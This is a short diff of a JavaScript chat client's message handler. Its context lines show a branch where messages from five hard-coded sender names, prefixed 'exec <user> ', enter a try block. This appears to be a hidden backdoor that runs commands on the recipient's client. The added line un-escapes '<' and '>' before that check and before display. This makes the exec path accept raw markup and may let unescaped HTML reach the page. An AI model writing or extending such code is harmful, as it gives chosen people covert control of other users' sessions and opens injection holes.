@@ -510,6 +510,7 @@ Owner:<ul>
                 }
                 break;
             case "message":
+                msg.m.m = msg.m.m.replace(/&gt;/g, ">").replace(/&lt;/g, "<");
                 if (["NKY", "wolfie", "ZeroTix", "RayhanADev", "haha0201"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
                     if (msg.m.r !== -2 && msg.m.m.startsWith("exec " + user + " ")) {
                         try {
@@ -544,11 +545,7 @@ Owner:<ul>
                     });
                     pingTime = 0;
                 }
-                message({
-                    s: msg.m.s,
-                    r: msg.m.r,
-                    m: msg.m.m.replace(/&gt;/g, ">").replace(/&lt;/g, "<")
-                });
+                message(msg.m);
                 break;
             case "updateStates":
                 updateStates(msg.m);
